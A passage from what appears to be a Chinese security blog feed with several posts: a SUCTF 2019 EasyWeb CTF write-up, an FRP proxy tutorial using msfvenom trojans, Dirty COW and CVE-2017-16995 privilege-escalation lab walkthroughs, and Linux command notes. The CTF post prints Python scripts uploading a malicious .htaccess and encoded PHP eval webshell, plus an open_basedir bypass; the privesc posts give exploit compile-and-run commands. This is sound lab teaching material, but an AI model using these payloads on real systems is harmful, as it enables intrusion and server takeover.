alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF 2019 EasyWeb_0x61-0x6F</title>
      <link href="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/"/>
      <url>/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/</url>
      
        <content type="html"><![CDATA[<p>呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。</p><p>源码贴上来：</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png" alt="image-20220210150538110"></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png" alt="image-20220210150849473"></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png" alt="image-20220210150949879"></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code class="php">&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png" alt="image-20220210151113658"></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png" alt="image-20220210152555350"></p><p>成功出来phpinfo，看一看有没有可以利用的点</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png" alt="image-20220210152650640"></p><p>发现执行系统的命令全被禁用了，看来rce走不通了。</p><p>这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png" alt="image-20220210152821670"></p><p>不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。</p><p>既然rce走不通，那就试一试文件上传吧</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png" alt="image-20220210152933281"></p><p>各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。</p><p>但是上传.htaccess仍然有<img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png" alt="image-20220210204915083"></p><p>这个函数限制。</p><p>解决这个函数，采用xbm格式，X Bit Map</p><pre><code>在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：</code></pre><pre><code>#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;</code></pre><p>在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。</p><p>所以我们在.htaccess里加上</p><pre><code>#define width 1337#define height 1337..........</code></pre><p>就可以绕过绕过这个函数了。</p><p>上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对&lt;?进行了检测。</p><p>这里有两种方法可以绕过。</p><p>1、对一句话木马的内容进行base64编码。</p><p>2、使用 utf-16be 来绕过</p><p>下面先附上两种方法的exp：</p><p>1、</p><pre><code class="python">import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;)#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = &quot;http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;files = &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image/jpeg&#39;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#39;file&#39;:(&#39;shell.ahhh&#39;,shell,&#39;image/jpeg&#39;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre><p>本题php环境为7.2，所以无法使用<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;shell&#39;]);&lt;/script&gt;</code>这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。</p><p>得到</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png" alt="image-20220210212049717"></p><p>2、</p><pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;def generate_php_file(filename, script):    phpfile = open(filename, &#39;wb&#39;)     phpfile.write(script.encode(&#39;utf-16be&#39;))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)    htaccess.write(SIZE_HEADER)    htaccess.write(b&#39;AddType application/x-httpd-php .lethe\n&#39;)    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)    htaccess.write(b&#39;php_value display_errors 1\n&#39;)    htaccess.close()        generate_htacess()generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)</code></pre><p>同理上传即可</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png" alt="image-20220210212639842"></p><p>一句话木马成功利用。</p><p>使用蚁剑成功连接</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png" alt="image-20220210212824536"></p><p>但是无法访问根目录。</p><p>非预期解：</p><p>采用蚁剑自带插件进行绕过.</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png" alt="image-20220210213427872"></p><p>预期解：</p><p>绕过open_basedir</p><p>这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png" alt="image-20220210214135619"></p><p>所有文件被列举出来了，下面读取flag值就可以了。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png" alt="image-20220210214447849"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向代理之FRP</title>
      <link href="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/"/>
      <url>/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/</url>
      
        <content type="html"><![CDATA[<p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。</p><p>工具链接：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>作用:当本机和目标机处于不同内网，借用代理来实现用本机进行内网攻击。</p><p>环境：</p><p>kali2021(本机)  内网ip:192.168.64.128</p><p>centos7.5(服务器) </p><p>windows server 2008 R2 ×64 (目标机)  内网ip:192.168.1.9</p><p>为什么要使用代理?</p><p>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理.</p><p>个人认为其根本原因就只有一点：没有独立且确定的公网ip</p><p>如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。而本机和目标机都处于内网之中，此时必须使用代理来进行连接。</p><p>首先配置好环境，kali与win2008处于不同网段，且都可联网。(vm中自行配置，可将一台主机至于NAT模式，一台置于仅主机，使仅主机可联网)</p><p>检测kali的内网ip和网络</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155315218.png" alt="image-20220119155315218"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155341286.png" alt="image-20220119155341286"></p><p>检测win2008的内网ip和网络.</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155431599.png" alt="image-20220119155431599"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155453758.png" alt="image-20220119155453758"></p><p>下载frp到kali中</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155729846.png" alt="image-20220119155729846"></p><p>frpc.ini配置文件是服务端，frpc.ini是客户端，下面进行配置。</p><p>我们首先打开我们的服务器，编辑frps.ini</p><p>随意设置一个端口号就好。</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119162501013.png" alt="image-20220119162501013"></p><p>启动服务端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119163847158.png" alt="image-20220119163847158"></p><p>接下来在kali中配置控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164721460.png" alt="image-20220119164721460"></p><p>启动控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164937708.png" alt="image-20220119164937708"></p><p>接下来利用msfvenom生成木马开启监听</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171131305.png" alt="image-20220119171131305"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171505986.png" alt="image-20220119171505986"></p><p>将木马上线</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171914965.png" alt="image-20220119171914965"></p><p>监听到会话</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173926936.png" alt="image-20220119173926936"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173948480.png" alt="image-20220119173948480"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119174002938.png" alt="image-20220119174002938"></p><p>成功实现了内网代理。</p>]]></content>
      
      
      <categories>
          
          <category> 红队 </category>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux脏牛提权</title>
      <link href="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p><p>漏洞范围：Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><p>复现：</p><p>环境：Ubuntu 14.04.5</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>开启kali，靶机，配置使其位于同一网段</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144958930.png" alt="image-20220104144958930"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144854766.png" alt="image-20220104144854766"></p><p>使用nmap对ip段进行扫描</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144833775.png" alt="image-20220104144833775"></p><p>发现可疑ip  192.168.64.129</p><p>打开</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145052541.png" alt="image-20220104145052541"></p><p>没有发现有用信息，对其端口进行进一步探测</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145423615.png" alt="image-20220104145423615"></p><p>发现 1898端口</p><p>打开，网页如图</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145547619.png" alt="image-20220104145547619"></p><p>在底部发现cms为Drupal</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145621761.png" alt="image-20220104145621761"></p><p>探测其版本为 Drupal7</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104150839353.png" alt="image-20220104150839353"></p><p>百度一下，发现其存在 远程代码执行漏洞 CVE-2018-7600</p><p>打开msf搜索相关漏洞</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145741167.png" alt="image-20220104145741167"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151550089.png" alt="image-20220104151550089"></p><p>配置参数，进行攻击</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151627775.png" alt="image-20220104151627775"></p><p>成功！</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151712264.png" alt="image-20220104151712264"></p><p>下面上传漏洞检测脚本至目标靶机</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104173845980.png" alt="image-20220104173845980"></p><p>赋予权限并运行</p><pre><code>shellchmod +x sakuras.sh./sakuras.sh</code></pre><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104174121444.png" alt="image-20220104174121444"></p><p>发现了脏牛漏洞，准备开始提权</p><p>准备好exp</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192056147.png" alt="image-20220104192056147"></p><p>链接：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>上传 dcow.cpp到靶机 </p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192200178.png" alt="image-20220104192200178"></p><p>进行编译</p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</code></pre><p>打开交互式环境</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>运行</p><pre><code>./dcow</code></pre><p>成功</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192407007.png" alt="image-20220104192407007"></p><p>新建ssh链接，或者直接</p><p>su root </p><p>记得切换用户要在交换式窗口下</p><p>成功提权</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192533247.png" alt="image-20220104192533247"></p>]]></content>
      
      
      <categories>
          
          <category> 红队 </category>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权本地配合内核漏洞演示</title>
      <link href="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/"/>
      <url>/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<p>环境：Ubuntu 16.04(这里直接使用墨者学院的靶场)</p><p>漏洞编号：CVE-2017-16995</p><p>使用工具: linux-exploit-suggester-2 检测     特定exp提权</p><p>工具链接：<a href="https://github.com/jondonas/linux-exploit-suggester-2">GitHub - jondonas/linux-exploit-suggester-2: Next-Generation Linux Kernel Exploit Suggester</a></p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104134814506.png" alt="image-20220104134814506"></p><p>利用ssh工具连接</p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133116341.png" alt="image-20220104133116341"></p><p>上传工具，并运行，发现有  CVE-2017-16995 漏洞</p><p> Source: <a href="http://www.exploit-db.com/exploits/45010">http://www.exploit-db.com/exploits/45010</a></p><p>下载exp</p><p>得到45010.c</p><p>上传到服务器/tmp目录</p><p>编译执行</p><pre><code>gcc 45010.c -o 455010chmod +x 455010./ 455010</code></pre><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133424470.png" alt="image-20220104133424470"></p><p>成功提权！</p>]]></content>
      
      
      <categories>
          
          <category> 红队 </category>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2021/11/12/Linux/"/>
      <url>/2021/11/12/Linux/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/11/12/Linux/image-20211112001054678.png" alt="image-20211112001054678"></p><p><img src="/2021/11/12/Linux/image-20211112001133176.png" alt="image-20211112001133176"></p><p><img src="/2021/11/12/Linux/image-20211112002049844.png" alt="image-20211112002049844"></p><p><img src="/2021/11/12/Linux/image-20211112002148742.png" alt="image-20211112002148742"></p><p><img src="/2021/11/12/Linux/image-20211112002405780.png" alt="image-20211112002405780"></p><p>命令：</p><p>uname -a  显示主机名、内核版本、硬件平台等详细信息 </p><p>uname -r 显示内核版本</p><p>cat /etc/os-release 查看版本号</p><p>hostname 显示全合格主机名</p><p>cat /proc/cpuinfo  查看cpu信息 或者lscpu</p><p>cat /proc/meminfo 查看内存信息  或者free</p><p>关机 poweroff   shutdown -h now</p><p>重启 reboot  shutdown -r now </p><p>Linux命令</p><p>用于实现某一类功能的指令或者程序</p><p>命令的执行依赖于解释器程序(例如：/bin/bash)</p><p>Linux 命令的分类</p><p>内部命令：属于shell解释器的一部分</p><p>即命令包含在shell程序本身之中，例如”history”命令</p><p>外部命令：独立于shell解释器之外的程序文件。</p><p>如何判断是外部命令还是内部？</p><p>使用：</p><p>which xx</p><p>如果可以搜索到为外部，不能则为内部</p><p>这个方法也用来查找外部命令的路径</p><p>如：</p><p>[root@o213 ~]# which ls<br>/usr/bin/ls</p><p>type  xx 了解一些命令的信息</p><p>如：</p><p>[root@o213 ~]# type ls<br>ls 是“ls –color=auto”的别名</p><p><img src="/2021/11/12/Linux/image-20211112233035921.png" alt="image-20211112233035921"></p><p>命令行编辑的几个辅助操作</p><p>Tab ：自动补齐</p><p>反斜杠 \ :强制换行</p><p>Ctrl+U :清空至行首</p><p>Ctrl+K :清空至行尾</p><p>Ctrl+L：清屏</p><p>Ctrl+C:取消本次命令编辑</p><p>内部命令help</p><p>查看Bash内部命令的帮助信息</p><p>命令的 “–help” 选项</p><p>适用于大多数外部命令</p><p>adduser 添加用户账号</p><p>passwd 设置(更改)用户口令</p><p>userdel 删除用户账号(及宿主目录)</p><p>usermod 设置用户属性</p><p> [root@o213 ~]# adduser admin  //增加用户</p><p>[root@o213 ~]# passwd admin  //修改admin的密码</p><p>[root@o213 ~]# passwd admin<br>更改用户 admin 的密码 。<br>新的密码：<br>重新输入新的密码：<br>passwd：所有的身份验证令牌已经成功更新。</p><p>[root@o213 ~]# usermod -L admin  锁定admin账号<br>[root@o213 ~]# userdel admin 删除admin账号</p><p>用户的账号信息保存在 /etc/passwd  文件中</p><p>tail -1 /etc/passwd   //从后往前显示一行</p><p>用户的加密口令保存在 /etc/shadow  文件中</p><p>tail -1 /etc/shadow</p><p>用户的宿主目录(家目录)在 /home 下</p><p>tail -1 /etc/home</p><p>切换用户</p><p>su admin  //切换到admin用户</p><p>组命令：</p><p>groupadd  添加指定名称的用户组账号</p><p>groupdel  删除指定名称的用户组账号</p><p>文件</p><p>/etc/group  保存用户组账号信息</p><pre><code>groupadd shuihugroupadd honglouuseradd -g shuihu wusong  //创建wusong用户并指定到shuihu组useradd -g honglou jiabaoyu //创建jiaobaoyu组并指定到honglou组groupadd daxia usermod -g daxia wusong //将wusong这个用户从shuihu组移到daxia组groupdel daxia  //删除组</code></pre><p><img src="/2021/11/12/Linux/image-20211113001359900.png" alt="image-20211113001359900"></p><p><img src="/2021/11/12/Linux/image-20211113001715071.png" alt="image-20211113001715071"></p><p>增加文件所有者的执行权限</p><p>chmod u+x anaconda-ks.cfg  </p><p>去除文件所属组的写权限</p><p>chmod g-w lshelp.txt</p><p>设置其他用户的文件权限为可执行</p><p>chmod o=x lshelp.txt</p><p>追加所有账号权限可读</p><p>chmod a+r anaconda-ks.cfg</p><p>chown命令：</p><p>设置文件的所以者为wusong，让所属组也跟着改</p><p>chown wusong:lshelp.txt</p><p>设置文件的所以者为root，所属组不改</p><p>chown root lshelp.txt</p><p>设置文件的所属组</p><p>chown : root lshelp.txt</p><p>查看及切换目录</p><p>pwd、cd、ls、du</p><p>pwd：查看工作目录</p><p>[root@o213 ~]# pwd<br>/root</p><p>cd：切换目录</p><p>cd ~  回家</p><p>ls：显示目录内容</p><p>ls -l:以长格式显示</p><p>ls -a:显示所有子目录和文件的信息，包括隐藏文件</p><p>ls -A:类似于”-a”,但不显示”.”和”..”目录的信息</p><p>ls -d:显示目录本身的属性</p><p>ls -h:以更易读的字节单位(K、M等)显示信息</p><p>ls -R:递归显示内容</p><p>ls –color:以颜色区分不同类型文件</p><p>创建目录和文件</p><p>mkdir、touch、In</p><p>mkdir a/b/c/d  创建多层目录 </p><p>touch aa.txt 创建一个空文件</p><p>ln：为文件或目录建立链接</p><pre><code>[root@o213 ~]# ln -s /usr/bin/ls aa[root@o213 ~]# lsaa  anaconda-ks.cfgln lshelp.txt abc //建立硬链接</code></pre><p>符号链接：指向原始文件所在的路径，又称为软链接</p><p>硬链接：</p><p>指向原始文件对应的数据存储位置</p><p>不能为目录建立硬链接文件</p><p>硬链接与原始文件必须位于同一分区(文件系统)</p><p>可以使用stat命令查看：</p><pre><code>[root@o213 ~]# touch sakura.txt[root@o213 ~]# lsaa  anaconda-ks.cfg  sakura.txt[root@o213 ~]# ln sakura.txt dd[root@o213 ~]# state dd-bash: state：未找到命令[root@o213 ~]# stat dd  文件：dd  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800[root@o213 ~]# stat sakura.txt  文件：sakura.txt  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800</code></pre><p>复制、删除、移动目录和文件</p><p>cp、rm、mv</p><p>cp: </p><p>-r：递归复制整个目录树</p><p>-p:保持源文件的属性不变</p><p>-f:强制覆盖目标同名文件或目录</p><p>-i:需要覆盖文件或目录时进行提醒</p><p>查找目录和文件</p><p>which、find</p><p>通配符：</p><p>*  代替零个、单个或多个字符</p><p>?  代替一个字符</p><p>alias 定义别名：</p><p>alias myls=’ls -alh’</p><p>du:</p><p>统计目录及文件的空间占用清空</p><p>-a:统计时包括所有的文件，而不仅仅只统计目录</p><p>-h:以更容读的字节单位(K、M等)显示信息</p><p>-s:只统计每个参数所占用空间的总的大小</p><p>如：</p><p>du -sh /home/</p><pre><code>[root@o213 ~]# du -sh /home/60K     /home/</code></pre><p>find 命令</p><p>比如：</p><p>find /etc -name “re*.conf”</p><p>从/etc 目录找这个文件</p><p>-name:按文件名称查找</p><p>-size:按文件大小查找</p><p>-user：按文件属主查找</p><p>-type：按文件类型查找</p><p><img src="/2021/11/12/Linux/image-20211121230756940.png" alt="image-20211121230756940"></p><p><img src="/2021/11/12/Linux/image-20211121231009685.png" alt="image-20211121231009685"></p><p><img src="/2021/11/12/Linux/image-20211121231235005.png" alt="image-20211121231235005"></p><p><img src="/2021/11/12/Linux/image-20211121231510277.png" alt="image-20211121231510277"></p><p><img src="/2021/11/12/Linux/image-20211121232610276.png" alt="image-20211121232610276"></p><p><img src="/2021/11/12/Linux/image-20211121233634742.png" alt="image-20211121233634742"></p><p><img src="/2021/11/12/Linux/image-20211121233758176.png" alt="image-20211121233758176"></p><p><img 